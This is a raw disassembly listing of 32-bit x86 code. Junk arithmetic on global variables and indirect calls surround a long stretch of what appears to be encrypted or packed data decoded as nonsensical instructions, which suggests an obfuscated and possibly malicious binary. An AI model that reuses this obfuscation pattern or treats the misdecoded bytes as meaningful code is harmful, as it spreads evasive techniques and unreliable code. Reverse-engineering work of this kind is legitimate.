  412dd2:	add    DWORD PTR ds:0x4283e9,0x428481
  412ddc:	xor    ecx,edx
  412dde:	cmp    DWORD PTR ds:0x428481,0x0
  412de5:	not    edx
  412de7:	not    edx
  412de9:	jmp    0x412e3e
  412dee:	mov    DWORD PTR ds:0x4284fd,edx
  412df4:	not    edx
  412df6:	cmp    DWORD PTR ds:0x428481,0x0
  412dfd:	je     0x412e29
  412e03:	push   0x8204
  412e08:	push   DWORD PTR [ebp-0x28]
  412e0b:	call   DWORD PTR ds:0x42e010
  412e11:	mov    edx,DWORD PTR ds:0x4283c9
  412e17:	xor    DWORD PTR ds:0x4284f9,edx
  412e1d:	mov    edx,DWORD PTR ds:0x428519
  412e23:	sub    DWORD PTR ds:0x428515,edx
  412e29:	inc    edx
  412e2a:	adc    edx,DWORD PTR ds:0x428515
  412e30:	xor    edx,edx
  412e32:	xor    edx,DWORD PTR ds:0x428411
  412e38:	adc    DWORD PTR ds:0x428509,edx
  412e3e:	mov    edx,DWORD PTR [ebp+0x8]
  412e41:	xor    eax,edi
  412e43:	mov    edi,DWORD PTR [ebp+0xc]
  412e46:	mov    DWORD PTR ds:0x428301,0x757
  412e50:	cmp    eax,edx
  412e52:	mov    DWORD PTR ds:0x4282d1,0x1fab
  412e5c:	jne    0x412e74
  412e62:	cmp    ecx,edi
  412e64:	mov    DWORD PTR ds:0x428315,0x4385
  412e6e:	je     0x414af6
  412e74:	add    eax,DWORD PTR ds:0x4283d1
  412e7a:	mov    eax,DWORD PTR [ebp-0x1c]
  412e7d:	neg    DWORD PTR ds:0x4282d9
  412e83:	mov    ecx,DWORD PTR [ebp-0x1c]
  412e86:	push   0xfffffffe
  412e88:	and    DWORD PTR ds:0x428311,edx
  412e8e:	pop    ebx
  412e8f:	or     DWORD PTR ds:0x42851d,edx
  412e95:	jmp    0x4131ce
  412e9a:	imul   ebx,DWORD PTR [edi+0x1cbccb74],0xf12aa079
  412ea4:	and    BYTE PTR [esi-0x61ef66c8],bl
  412eaa:	mov    WORD PTR [eax-0x42],?
  412ead:	mov    esi,0xbebec4ed
  412eb2:	outs   dx,DWORD PTR ds:[esi]
  412eb3:	pop    es
  412eb4:	add    al,0x8b
  412eb6:	jmp    0x70337682
  412ebb:	dec    esi
  412ebc:	sbb    ah,BYTE PTR [edi-0x5f]
  412ebf:	popf   
  412ec0:	out    dx,al
  412ec1:	sub    eax,0xe63e404c
  412ec6:	mov    esi,0xece4e587
  412ecb:	sahf   
  412ecc:	mov    esp,DWORD PTR [ecx]
  412ece:	xor    edx,DWORD PTR [esi+0x3c]
  412ed1:	sbb    ebx,DWORD PTR [edi+edx*8+0x5603dfc0]
  412ed8:	pusha  
  412ed9:	sub    BYTE PTR ds:0xc79d147a,bl
  412edf:	dec    esp
  412ee0:	fstp   TBYTE PTR gs:[ecx]
  412ee3:	shl    DWORD PTR [edx-0x5171e230],1
  412ee9:	fwait
  412eea:	rol    DWORD PTR [esi+0x1],1
  412eed:	(bad)
  412ef0:	jge    0x412f4a
  412ef2:	int3   
  412ef3:	mov    ebx,esi
  412ef5:	pop    edi
  412ef6:	or     esp,edx
  412ef8:	in     eax,dx
  412ef9:	sbb    bh,BYTE PTR [esi]
  412efb:	aam    0xd9
  412efd:	pop    esi
  412efe:	ds jnp 0x412f5a
  412f01:	out    dx,al
  412f02:	or     eax,0xb4b60709
  412f07:	jp     0x412edd
  412f09:	sbb    BYTE PTR [eax+0x15ad47c8],ch
  412f0f:	stos   BYTE PTR es:[edi],al
  412f10:	dec    ebx
  412f11:	jae    0x412ea2
  412f13:	mov    al,ds:0x683bee2b
  412f18:	mov    eax,ds:0xc1697833
  412f1d:	cmc    
  412f1e:	and    ebp,esi
  412f20:	stos   DWORD PTR es:[edi],eax
  412f21:	jns    0x412f0b
  412f23:	or     BYTE PTR [eax],bl
  412f25:	ins    DWORD PTR es:[edi],dx
  412f26:	enter  0x2074,0x7d
  412f2a:	mov    esi,0x6d541446
  412f2f:	fadd   st,st(1)
  412f31:	mov    ebx,0x17475159
  412f36:	aam    0x3f
  412f38:	(bad)  [edx+0x7a9bf1a3]
  412f3e:	xor    eax,0xebce9e7f
  412f43:	cmp    ecx,DWORD PTR [ecx-0x20950a62]
  412f49:	add    al,0x15
  412f4b:	xchg   ebp,eax
  412f4c:	sub    eax,0xeeeebfde
  412f51:	stos   DWORD PTR es:[edi],eax
  412f52:	int    0xa3
  412f54:	xchg   edi,eax
  412f55:	sbb    eax,0x40c81ba4
  412f5a:	in     al,dx
  412f5b:	xchg   BYTE PTR [ebx-0x3e],ch
  412f5e:	addr16 mov al,0xc4
  412f61:	sbb    al,0x4d
  412f63:	dec    esi
  412f64:	mov    eax,ds:0x6d252480
  412f69:	out    0x97,eax
  412f6b:	dec    ebp
  412f6c:	shr    DWORD PTR [ebx+edi*1-0x6b],0xa5
  412f71:	xchg   BYTE PTR [eax],bl
  412f73:	or     eax,0xa102b8ed
  412f78:	sub    DWORD PTR [esi],esi
  412f7a:	cmp    eax,0xd0f9e572
  412f7f:	fwait
  412f80:	or     DWORD PTR [eax-0x7e],0x3bb054b5
  412f87:	and    eax,0x3958196e
  412f8c:	pop    ds
  412f8d:	mov    bl,BYTE PTR [ebx]
  412f8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412f90:	mov    al,BYTE PTR [eax]
  412f92:	mov    ecx,0xa5aa1a1d
  412f97:	popf   
  412f98:	mov    esi,0xfc1b9d4d
  412f9d:	dec    edi
  412f9e:	add    eax,0x5bb55e78
  412fa3:	jecxz  0x412ff2
  412fa5:	push   eax
  412fa6:	loope  0x412f2f
  412fa8:	mov    BYTE PTR [esi+ecx*1],dh
  412fab:	adc    dl,bl
  412fad:	push   esp
  412fae:	mov    ah,0x31
  412fb0:	xor    eax,0xd085baa
  412fb5:	xor    ebp,DWORD PTR [esi+eax*4-0x7e]
  412fb9:	enter  0x9d3b,0x11
  412fbd:	add    eax,0xd9a661c0
  412fc2:	call   0x6af9:0x1a915627
  412fc9:	pop    DWORD PTR [edx+0x1]
  412fcc:	int    0x70
  412fce:	cmp    al,0x85
  412fd0:	stc    
  412fd1:	and    al,0xa7
  412fd3:	ss jmp 0x413051
  412fd6:	(bad)  
  412fd7:	mov    esi,0x884f794b
  412fdc:	out    0xa2,al
  412fde:	cli    
  412fdf:	jno    0x41300f
  412fe1:	iret   
  412fe2:	lock and bl,BYTE PTR es:[esi]
  412fe6:	adc    BYTE PTR ds:0x197000b,bl
  412fec:	in     al,0xfe
  412fee:	retf   0x8da8
  412ff1:	inc    ecx
  412ff2:	aas    
  412ff3:	pop    ds
  412ff4:	lods   al,BYTE PTR ds:[esi]
  412ff5:	push   0xffffffc9
  412ff7:	(bad)  
  412ff8:	loop   0x413042
  412ffa:	or     eax,0xa253ef61
  412fff:	push   es
  413000:	sub    DWORD PTR [eax-0x2395aed2],eax
  413006:	add    eax,0x9795da37
  41300b:	sti    
  41300c:	mov    BYTE PTR [ecx],dh
  41300e:	lock hlt 
  413010:	push   esi
  413011:	lods   al,BYTE PTR ds:[esi]
  413012:	sahf   
  413013:	mov    cl,0x8e
  413015:	ins    DWORD PTR es:[edi],dx
  413016:	mov    al,ds:0xccd50411
  41301b:	inc    edx
  41301c:	sbb    eax,DWORD PTR [ebp+0x76dd469]
  413022:	es call 0x63ee:0x31039343
  41302a:	sti    
  41302b:	xchg   ebx,eax
  41302c:	inc    esp
  41302d:	xchg   esp,eax
  41302e:	add    ecx,esp
  413030:	mov    eax,ds:0xd11eec9b
  413035:	fstp   TBYTE PTR [edi]
  413037:	jmp    0x3ec4500
  41303c:	xor    BYTE PTR [ecx-0x4011bea1],bh
  413042:	outs   dx,BYTE PTR ds:[esi]
  413043:	icebp  
  413044:	pop    edi
  413045:	mov    esp,0xeaa04e0b
  41304a:	shl    dh,cl
  41304c:	pop    eax
  41304d:	bts    ebp,eax
  413050:	out    dx,al
  413051:	jnp    0x413081
  413053:	mov    al,0x3b
  413055:	clc    
  413056:	mov    al,ds:0xc2ec31e6
  41305b:	aaa    
  41305c:	retf   
  41305d:	inc    ebx
  41305e:	and    al,0x75
  413060:	cmc    
  413061:	fwait
  413062:	sbb    ch,BYTE PTR [eax-0x5df42b74]
  413068:	xor    cl,BYTE PTR [ebx+0x1fd68c44]
  41306e:	(bad)  
  41306f:	cmc    
  413070:	sub    edi,edx
  413072:	ins    DWORD PTR es:[edi],dx
  413073:	and    al,0x4e
  413075:	jnp    0x413074
  413077:	jnp    0x413064
  413079:	push   esi
  41307a:	stc    
  41307b:	ds paddb mm7,mm7
  41307f:	cs xchg ecx,eax
  413081:	addr16 call 0x6138:0xae6b3840
  413089:	add    BYTE PTR [edi+0x29],dh
  41308c:	xor    DWORD PTR [ebp-0x8],ebp
  41308f:	jp     0x4130b9
  413091:	cmp    cl,BYTE PTR [ebp+ebx*2+0x5be7fee4]
  413098:	pop    ebx
  413099:	sub    dl,bh
  41309b:	in     al,dx
  41309c:	outs   dx,DWORD PTR ds:[esi]
  41309d:	sub    edi,DWORD PTR [ebx-0x57afb6af]
  4130a3:	cwde   
  4130a4:	add    DWORD PTR es:[eax],esp
  4130a7:	(bad)  
  4130a8:	mov    ebx,0x9b664ab2
  4130ad:	xor    BYTE PTR [ebx],bh
  4130af:	push   edx
  4130b0:	mov    eax,0xba601777
  4130b5:	lahf   
  4130b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4130b7:	loop   0x4130c9
  4130b9:	add    DWORD PTR [edi+eiz*2-0x462a5464],eax
  4130c0:	std    
  4130c1:	nop
  4130c2:	and    al,0xdd
  4130c4:	imul   edx,DWORD PTR [edx+0x50],0x938200b
  4130cb:	lds    eax,FWORD PTR [edx-0x63]
  4130ce:	sub    bh,ah
  4130d0:	adc    esp,esi
  4130d2:	rcr    DWORD PTR [ebx-0x758ff509],1
  4130d8:	xchg   esi,eax
  4130d9:	ja     0x4130ad
  4130db:	inc    edx
  4130dc:	cmp    eax,0x2d4b7760
  4130e1:	mov    ds,esp
  4130e3:	mov    edx,0xb88973ba
  4130e8:	aam    0xeb
  4130ea:	jmp    0x5c968a6a
  4130ef:	xlat   BYTE PTR ds:[ebx]
  4130f0:	push   ss
  4130f1:	cmp    DWORD PTR [eax+0x9],esi
  4130f4:	or     al,BYTE PTR [ebp-0x68]
  4130f7:	cwde   
  4130f8:	call   0xf05fd05a
  4130fd:	dec    edx
  4130fe:	ins    BYTE PTR es:[edi],dx
  4130ff:	inc    esp
  413100:	cld    
  413101:	ret    0x8ac8
  413104:	mov    ds,eax
  413106:	enter  0x2d49,0x30
  41310a:	mov    esi,esp
  41310c:	das    
  41310d:	pop    esp
  41310e:	gs (bad) 
  413111:	imul   dh
  413113:	out    dx,eax
  413114:	inc    ecx
  413115:	push   edi
  413116:	and    eax,0x97d342e5
  41311b:	or     ebp,DWORD PTR [ecx]
  41311d:	ins    BYTE PTR es:[edi],dx
  41311e:	retf   0x809d
  413121:	inc    edi
  413122:	pop    eax
  413123:	dec    edx
  413124:	ins    DWORD PTR es:[edi],dx
  413125:	out    0x95,al
  413127:	lea    eax,[eax+0x47]
  41312a:	dec    ebx
  41312b:	pop    edx
  41312c:	inc    esp
  41312d:	(bad)  
  41312e:	dec    esi
  41312f:	scas   eax,DWORD PTR es:[edi]
  413130:	out    dx,al
  413131:	jge    0x413178
  413133:	in     eax,dx
  413134:	xor    edi,eax
  413136:	shl    ebp,cl
  413138:	test   eax,0x5ebbf222
  41313d:	out    dx,eax
  41313e:	ins    DWORD PTR es:[edi],dx
  41313f:	lea    ebp,[ebp-0x4d]
  413142:	shl    BYTE PTR [esp+esi*8],1
  413145:	das    
  413146:	enter  0xe22,0xb8
  41314a:	xor    ebp,DWORD PTR [ecx-0x5d]
  41314d:	dec    ebx
  41314e:	out    0xff,eax
  413150:	repz aaa 
  413152:	sub    al,0xcb
  413154:	idiv   BYTE PTR [ebx+0x6b2b24a3]
  41315a:	mov    al,ds:0x28743d68
  41315f:	pushf  
  413160:	addr16 shl dh,1
  413163:	(bad)  
  413164:	pop    ebx
  413165:	sub    ch,dl
  413167:	jmp    0x91338c2d
  41316c:	fwait
  41316d:	mov    bl,0x2d
  41316f:	sub    DWORD PTR [edx+0x2d],ebp
  413172:	cmp    esp,DWORD PTR [ebp-0x262ef08a]
  413178:	dec    ebp
  413179:	pop    ds
  41317a:	popf   
  41317b:	mov    di,0xf866
  41317f:	fwait
  413180:	pushf  
  413181:	and    bl,BYTE PTR [ecx]
  413183:	cmp    al,0xd6
  413185:	idiv   BYTE PTR [edx]
  413187:	aas    
  413188:	mov    al,0x5f
  41318a:	fistp  WORD PTR fs:[edi+0x49]
  41318e:	push   ds
  41318f:	cmc    
  413190:	and    al,0x91
  413192:	push   ds
  413193:	stos   DWORD PTR es:[edi],eax
  413194:	cs aam 0x52
  413197:	adc    al,0x35
  413199:	scas   eax,DWORD PTR es:[edi]
  41319a:	cmp    edx,DWORD PTR [edx+0x23]
  41319d:	mov    ebx,0x7a5953c5
  4131a2:	inc    eax
  4131a3:	fwait
  4131a4:	or     eax,0x9c30e7f4
  4131a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4131aa:	sub    bh,0xb0
  4131ad:	dec    edx
  4131ae:	fnsave [esi-0x59]
  4131b1:	int3   
  4131b2:	mov    ds,WORD PTR [ebx+0x70]
  4131b5:	push   0xffffffd4
  4131b7:	rcl    BYTE PTR [ecx-0xc],0x18
  4131bb:	mov    ds:0xace26fcc,eax
  4131c0:	out    0xcc,eax
  4131c2:	mov    edx,0xc32a7572
  4131c7:	addr16 rcl esp,0xa8
  4131cb:	fidivr WORD PTR gs:[edi]
  4131ce:	xor    ecx,ebx
  4131d0:	xor    edi,edi
  4131d2:	add    edi,DWORD PTR ds:0x4283d5
  4131d8:	sub    DWORD PTR ds:0x4283b5,edi
  4131de:	shl    ecx,0x1e
  4131e1:	xor    DWORD PTR ds:0x428305,0x3d84
  4131eb:	mov    edi,0xa5069baf
  4131f0:	xor    eax,edi
  4131f2:	shr    eax,0x2
  4131f5:	jmp    0x41352e
  4131fa:	jmp    0x8a913c60
  4131ff:	mov    eax,0x40087bbc
  413204:	push   0xffffffd1
  413206:	enter  0x2db,0xdd
  41320a:	mov    esp,0xedbebe7e
  41320f:	les    edi,FWORD PTR [esi-0x2afbd142]
  413215:	mov    esp,gs
  413217:	jnp    0x413250
  413219:	out    dx,eax
  41321a:	xchg   ebx,eax
  41321b:	mov    edi,0xd8fd88f5
  413220:	ret    0xdff0
  413223:	lods   al,BYTE PTR ds:[esi]
  413224:	lods   al,BYTE PTR ds:[esi]
  413225:	mov    edx,edx
  413227:	mov    ch,0x68
  413229:	retf   0x6a9c
  41322c:	jl     0x4131dc
  41322e:	int3   
  41322f:	dec    ecx
  413230:	inc    esp
  413231:	or     DWORD PTR [edx-0x20],0x34fbd030
  413238:	inc    ebp
  413239:	fnstcw WORD PTR [esi-0x12]
  41323c:	sbb    ch,BYTE PTR [ecx+eiz*2]
  41323f:	xor    DWORD PTR [esi+0x687f8c5],edi
  413245:	loope  0x4131e3
  413247:	xchg   BYTE PTR [esi-0x7],ah
  41324a:	push   ss
  41324b:	iret   
  41324c:	jle    0x4131f4
  41324e:	push   0xffffffec
  413250:	shl    BYTE PTR [esp+edx*4],1
  413253:	test   eax,0x427fce52
  413258:	push   ds
  413259:	fcomp  QWORD PTR [edx+0x1b]
  41325c:	arpl   WORD PTR [ebx-0x29],bp
  41325f:	mov    ebx,0xa088d69d
  413264:	(bad)  
  413266:	mov    eax,0xecaa15c0
  41326b:	das    
  41326c:	pop    eax
  41326d:	xchg   edx,eax
  41326e:	mov    ds:0x4ae1bc1d,eax
  413273:	mov    esi,0x4e070acb
  413278:	not    BYTE PTR [ebp-0x4a]
  41327b:	sti    
  41327c:	jge    0x413205
  41327e:	aaa    
  41327f:	push   0xffffff80
  413281:	sub    ecx,edx
  413283:	dec    edx
  413284:	ror    BYTE PTR [ecx],cl
  413286:	jmp    DWORD PTR [edx+0x35]
  413289:	add    al,0x55
  41328b:	add    eax,0x9b609072
  413290:	sbb    dh,BYTE PTR [esi]
  413292:	sbb    DWORD PTR [esi],0xffffffb4
  413295:	mov    bl,0x95
  413297:	out    dx,al
  413298:	sti    
  413299:	int3   
  41329a:	mov    ah,0x84
  41329c:	dec    esp
  41329d:	sub    ah,bh
  41329f:	test   DWORD PTR [esi-0x31afa483],0x846d8afa
  4132a9:	adc    al,0x1
  4132ab:	and    al,0x6d
  4132ad:	and    esp,eax
  4132af:	sbb    edx,DWORD PTR [esi-0x68]
  4132b2:	(bad)  
  4132b3:	pop    eax
  4132b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4132b5:	jp     0x41330c
  4132b7:	clc    
  4132b8:	lock mov ds:0x9445bb1a,al
  4132be:	int    0xb8
  4132c0:	pop    ds
  4132c1:	lock pop edi
  4132c3:	cld    
  4132c4:	out    0x6f,eax
  4132c6:	fnsave [esp+ebp*1+0x34]
  4132ca:	sbb    eax,0xb2545b1d
  4132cf:	add    al,0x2d
  4132d1:	mov    ebx,DWORD PTR [edi+ebp*2+0x27d6598e]
  4132d8:	bound  ebx,QWORD PTR [ebx]
  4132da:	(bad)
  4132de:	dec    esi
  4132df:	dec    esi
  4132e0:	js     0x4132da
  4132e2:	(bad)  
  4132e3:	mov    eax,ds:0xc18ea31c
  4132e8:	sbb    al,0x8c
  4132ea:	lods   al,BYTE PTR ds:[esi]
  4132eb:	(bad)  
  4132ec:	adc    eax,0xc9dac790
  4132f1:	jle    0x413352
  4132f3:	rcr    BYTE PTR [ebx-0x80],cl
  4132f6:	aas    
  4132f7:	bswap  edx
  4132f9:	sbb    eax,0xb2d66d89
  4132fe:	inc    ebx
  4132ff:	std    
  413300:	and    eax,0x94552d08
  413305:	sub    ah,dl
  413307:	xchg   edx,eax
  413308:	jno    0x4132a1
  41330a:	jecxz  0x41331c
  41330c:	daa    
  41330d:	test   BYTE PTR [eax+ecx*2-0x14d229ff],cl
  413314:	xor    eax,0x1f96f9a
  413319:	aaa    
  41331a:	or     ah,ah
  41331c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41331d:	inc    ecx
  41331e:	or     al,0x75
  413320:	pop    edi
  413321:	cdq    
  413322:	(bad)  
  413323:	outs   dx,BYTE PTR ss:[esi]
  413325:	scas   al,BYTE PTR es:[edi]
  413326:	les    edx,FWORD PTR [ecx+0x1c]
  413329:	mov    bl,0xe2
  41332b:	sbb    DWORD PTR [ebx],edi
  41332d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41332e:	int3   
  41332f:	jge    0x4132ea
  413331:	pop    esp
  413332:	lods   eax,DWORD PTR ds:[esi]
  413333:	cmp    ch,bh
  413335:	sbb    eax,0x470869cd
  41333a:	rcl    BYTE PTR ds:[edx-0x22],1
  41333e:	jecxz  0x4132ff
  413340:	or     al,0x50
  413342:	ss cs jbe 0x413381
  413346:	xor    eax,0xe96a6246
  41334b:	push   ds
  41334c:	xchg   edi,eax
  41334d:	sbb    eax,0x5ce46d93
  413352:	mov    dl,BYTE PTR [esi-0x4e48e566]
  413358:	mov    edi,ebp
  41335a:	fwait
  41335b:	gs jmp 0x4133c9
  41335e:	cmp    al,0x3d
  413360:	add    ah,bl
  413362:	jge    0x4133a4
  413364:	lock out 0x94,eax
  413367:	cmc    
  413368:	out    0x2,al
  41336a:	into   
  41336b:	test   ah,dh
  41336d:	inc    edx
  41336e:	xor    al,0x72
  413370:	in     al,0x48
  413372:	sbb    BYTE PTR [ecx+eiz*2],0x4d
  413376:	mov    dh,0x3e
  413378:	dec    esp
  413379:	out    0xf7,eax
  41337b:	push   edx
  41337c:	mov    ds:0x41b6bdd9,al
  413381:	dec    esi
  413382:	cmp    BYTE PTR [edi+0x581a9f8e],bl
  413388:	mov    edx,0x88dcd2b8
  41338d:	fwait
  41338e:	push   edi
  41338f:	adc    bl,bh
  413391:	dec    ecx
  413392:	cmovp  ecx,esp
  413395:	or     BYTE PTR [edx+ecx*4-0x4a816586],al
  41339c:	jecxz  0x413372
  41339e:	sub    DWORD PTR [ebx],edx
  4133a0:	push   ebx
  4133a1:	mov    ah,0x4a
  4133a3:	jp     0x413336
  4133a5:	loope  0x413370
  4133a7:	adc    DWORD PTR [esi-0x6d63c78d],0xa41097b1
  4133b1:	mov    eax,0xde84abc2
  4133b6:	call   0xc2038af5
  4133bb:	dec    ecx
  4133bc:	cwde   
  4133bd:	jmp    0xf822:0xf0e43475
  4133c4:	cmp    bl,ch
  4133c6:	scas   al,BYTE PTR es:[edi]
  4133c7:	ss mov edi,0x9755c6f8
  4133cd:	push   edi
  4133ce:	sub    eax,0xa461fad4
  4133d3:	aam    0xfb
  4133d5:	mov    ah,0x57
  4133d7:	push   esi
  4133d8:	push   ss
  4133d9:	xor    al,0xd0
  4133db:	push   ds
  4133dc:	jne    0x4133a7
  4133de:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4133e0:	xor    DWORD PTR [ecx],edx
  4133e2:	add    ebp,DWORD PTR [esi-0x3cb7c3d4]
  4133e8:	rcl    DWORD PTR [eax+eax*4+0x2cc2d0fd],1
  4133ef:	hlt    
  4133f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4133f1:	or     esp,esp
  4133f3:	jl     0x4133dd
  4133f5:	sbb    eax,0xf9b77d1a
  4133fa:	ficom  WORD PTR [eax-0x3f3fc9f9]
  413400:	dec    ecx
  413401:	retf   
  413402:	mov    WORD PTR [edx-0x56],ds
  413405:	inc    ecx
  413406:	dec    edx
  413407:	dec    edi
  413408:	xor    DWORD PTR [edx+ecx*1],edx
  41340b:	outs   dx,DWORD PTR ds:[esi]
  41340c:	mov    ecx,0xb092946c
  413411:	mov    edx,0x5a2eb1d7
  413416:	sbb    al,0x60
  413418:	pop    edi
  413419:	in     eax,0x4
  41341b:	lock inc eax
  41341d:	and    DWORD PTR ds:0xe1a82013,0x7e
  413424:	fbld   TBYTE PTR [eax-0x74]
  413427:	dec    esp
  413428:	mov    cl,0x49
  41342a:	sti    
  41342b:	icebp  
  41342c:	push   0x47f0ce1d
  413431:	rol    DWORD PTR [ebx+0x3f],1
  413434:	xchg   esp,eax
  413435:	enter  0xed5b,0x83
  413439:	mov    ch,0xf
  41343b:	push   ebx
  41343c:	bound  ecx,QWORD PTR [edi+ebx*2]
  41343f:	clc    
  413440:	in     ax,dx
  413442:	mov    ds:0xed1f3c2b,al
  413447:	adc    bh,BYTE PTR [ecx]
  413449:	mov    edx,0x6a15f7b1
  41344e:	outs   dx,DWORD PTR ds:[esi]
  41344f:	mov    ds:0x53ed42c2,eax
  413454:	sahf   
  413455:	adc    bh,0x78
  413458:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413459:	js     0x413415
  41345b:	int3   
  41345c:	rcl    cl,1
  41345e:	push   ebx
  41345f:	sbb    al,0x2f
  413461:	push   ebp
  413462:	jmp    0x5098e6b1
  413467:	push   0xa82d3e01
  41346c:	ins    DWORD PTR es:[edi],dx
  41346d:	inc    ebx
  41346e:	ss mov ah,0x90
  413471:	idiv   BYTE PTR [ecx+0x4a]
  413474:	ret    
  413475:	call   0x7366bba0
  41347a:	je     0x4134b2
  41347c:	jne    0x413418
  41347e:	mov    es,WORD PTR [edi-0x6610d479]
  413484:	adc    BYTE PTR ds:0x7a285f7a,bl
  41348a:	cwde   
  41348b:	lock loope 0x4134f3
  41348e:	scas   al,BYTE PTR es:[edi]
  41348f:	mov    ebp,0xdce96fc9
  413494:	jge    0x41345e
  413496:	in     al,dx
  413497:	inc    esi
  413498:	inc    eax
  413499:	loopne 0x413425
  41349b:	cld    
  41349c:	out    dx,al
  41349d:	ins    DWORD PTR es:[edi],dx
  41349e:	sbb    bl,BYTE PTR [ecx-0x44383c75]
  4134a4:	xor    dh,ch
  4134a6:	add    eax,0xdcb77cfa
  4134ab:	ficom  DWORD PTR [ebx]
  4134ad:	stos   DWORD PTR es:[edi],eax
  4134ae:	out    dx,al
  4134af:	test   BYTE PTR [ebp+0x3423ead8],dh
  4134b5:	jbe    0x41348d
  4134b7:	adc    bh,BYTE PTR [edx]
  4134b9:	add    eax,0xdfc256a6
  4134be:	test   BYTE PTR [eax],al
  4134c0:	add    bh,BYTE PTR [edx+ebp*4+0x6c]
  4134c4:	adc    DWORD PTR [esp+ecx*2],ebx
  4134c7:	push   ds
  4134c8:	push   ebp
  4134c9:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  4134cb:	push   esp
  4134cc:	xor    esp,DWORD PTR [eax+edx*1-0x35]
  4134d0:	add    ecx,ebx
  4134d2:	imul   ecx,DWORD PTR [ebp-0x202375d],0xe104cba3
  4134dc:	mov    ecx,0x378ea85d
  4134e1:	daa    
  4134e2:	inc    edx
  4134e3:	pop    es
  4134e4:	sub    eax,0x9aee2b78
  4134e9:	add    eax,0xc4de4858
  4134ee:	mov    ah,0x77
  4134f0:	stos   DWORD PTR es:[edi],eax
  4134f1:	or     DWORD PTR [bp+di],ecx
  4134f4:	cmp    eax,0x300640b
  4134f9:	dec    edi
  4134fa:	lahf   
  4134fb:	mov    edi,DWORD PTR ds:0xa3b45e1d
  413501:	push   ecx
  413502:	xor    ebx,ecx
  413504:	sub    eax,0xcf2ad868
  413509:	inc    edx
  41350a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41350b:	pop    esi
  41350c:	out    0x34,al
  41350e:	jg     0x41350b
  413510:	and    eax,0xe1b09dfe
  413515:	cld    
  413516:	pushf  
  413517:	ja     0x4134c2
  413519:	xchg   ecx,eax
  41351a:	pop    edx
  41351b:	std    
  41351c:	jbe    0x4134d5
  41351e:	repz push es
  413520:	fadd   QWORD PTR [edi]
  413522:	popf   
  413523:	jle    0x4134fd
  413525:	mov    esi,0xfe607588
  41352a:	pushf  
  41352b:	lods   eax,DWORD PTR ds:[esi]
  41352c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41352d:	mov    esp,0x3d83c10b
  413532:	rol    DWORD PTR [edx-0x38ffffbe],1
  413538:	add    eax,0x4283e1
  41353d:	or     DWORD PTR [ebx+0x0],ebx
  413540:	add    BYTE PTR [edi],cl
  413542:	mov    bh,0xd
  413544:	stc    
  413545:	add    BYTE PTR [edx+0x0],0xe9
  413549:	fld    DWORD PTR [eax]
  41354b:	add    BYTE PTR [eax],al
  41354d:	mov    DWORD PTR ds:0x42830d,0x463b
  413557:	cmp    DWORD PTR ds:0x4282d1,0x0
  41355e:	ja     0x413594
  413564:	push   0x1092
  413569:	push   0x34c2
  41356e:	push   DWORD PTR [ebp-0x10]
  413571:	push   0x63e1
  413576:	push   0x428235
  41357b:	push   DWORD PTR [ebp-0x24]
  41357e:	call   DWORD PTR ds:0x42e0d8
  413584:	adc    DWORD PTR ds:0x428499,0x3ae5
  41358e:	or     ecx,DWORD PTR ds:0x4284e9
  413594:	mov    ecx,DWORD PTR ds:0x428479
  41359a:	xor    DWORD PTR ds:0x428505,ecx
  4135a0:	add    DWORD PTR ds:0x428465,0x73c1
  4135aa:	xor    DWORD PTR ds:0x428471,0x45f8
  4135b4:	cmp    DWORD PTR ds:0x42849d,0x0
  4135bb:	mov    ecx,0x9c7
  4135c0:	mov    DWORD PTR ds:0x4282ed,0x5708
  4135ca:	mov    DWORD PTR ds:0x428471,0x67de
  4135d4:	jmp    0x413626
  4135d9:	mov    ecx,DWORD PTR ds:0x4282ed
  4135df:	cmp    DWORD PTR ds:0x42849d,0x0
  4135e6:	jl     0x413613
  4135ec:	push   DWORD PTR [ebp-0x14]
  4135ef:	push   DWORD PTR [ebp-0x10]
  4135f2:	push   DWORD PTR [ebp-0x28]
  4135f5:	call   DWORD PTR ds:0x42e0dc
  4135fb:	adc    DWORD PTR ds:0x4283cd,edx
  413601:	mov    ecx,DWORD PTR ds:0x4282e1
  413607:	and    DWORD PTR ds:0x4284ed,ecx
  41360d:	and    DWORD PTR ds:0x4282f5,edx
  413613:	mov    ecx,DWORD PTR ds:0x4283c1
  413619:	xor    ecx,DWORD PTR ds:0x4283f1
  41361f:	mov    DWORD PTR ds:0x4283c1,ecx
  413625:	dec    ecx
  413626:	mov    DWORD PTR [ebp-0xc],eax
  413629:	cmp    DWORD PTR ds:0x4283e9,0x0
  413630:	mov    DWORD PTR ds:0x4283c5,0x7db5
  41363a:	mov    DWORD PTR ds:0x4283fd,edi
  413640:	jmp    0x4136bd
  413645:	mov    ecx,DWORD PTR ds:0x4282d5
  41364b:	mov    eax,ds:0x4283dd
  413650:	cmp    DWORD PTR ds:0x4283e9,0x0
  413657:	je     0x4136a7
  41365d:	push   DWORD PTR [ebp-0x20]
  413660:	push   DWORD PTR [ebp-0x28]
  413663:	push   DWORD PTR [ebp-0x28]
  413666:	push   DWORD PTR [ebp-0xc]
  413669:	push   DWORD PTR [ebp-0x18]
  41366c:	push   DWORD PTR [ebp-0xc]
  41366f:	push   DWORD PTR [ebp-0x14]
  413672:	push   DWORD PTR [ebp-0x1c]
  413675:	push   DWORD PTR [ebp-0x20]
  413678:	push   DWORD PTR [ebp-0x14]
  41367b:	push   0x6fca
  413680:	push   DWORD PTR [ebp-0x14]
  413683:	push   0x1843
  413688:	call   DWORD PTR ds:0x42e014
  41368e:	movzx  ecx,BYTE PTR ds:0x4283cd
  413695:	and    DWORD PTR ds:0x4284e9,ecx
  41369b:	sbb    ecx,0x7147
  4136a1:	and    DWORD PTR ds:0x428465,ebx
  4136a7:	mov    ecx,DWORD PTR ds:0x428415
  4136ad:	add    DWORD PTR ds:0x4283bd,ecx
  4136b3:	and    DWORD PTR ds:0x42830d,0x5196
  4136bd:	mov    eax,ds:0x4226a8
